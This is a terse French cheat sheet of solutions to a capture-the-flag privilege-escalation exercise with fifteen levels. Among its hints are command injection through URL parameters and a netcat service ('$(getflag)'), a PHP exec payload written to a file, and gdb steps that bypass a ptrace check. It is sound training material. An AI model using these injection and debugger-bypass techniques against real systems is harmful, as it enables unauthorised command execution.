## Memento

### Level00:

Code cesar

### Leve01:

John the Ripper

### Level02:

wireshark

### Level03:

echo

### Level04:

Injection de code avec
curl 'localhost:4747/?x=$(getflag)'


### Level05:

cron

### Level06:

echo '[x {${exec(getflag)}}]' > /tmp/get_token
./level06 /tmp/get_token

### Level07:

export LOGNAME

### Level08:

t0ken

### Level09:

aaaa -> abcd 
python decode.py $(cat token)

### Level10

server.py & liens symboliques

### Level11

nc localhost 5151
 $(getflag) |wall

### Level12:

'getflag | wall' > /tmp/GETFLAG
chmod 755
curl '127.0.0.1:4646?x=$(/*/GETFLAG)'

### Level13:

gdb getuid()

### Level14

suppression de ptrace (bypassing ptrace)
catch syscall ptrace
commands 1
set $eax=0
continue
end

idem Level13
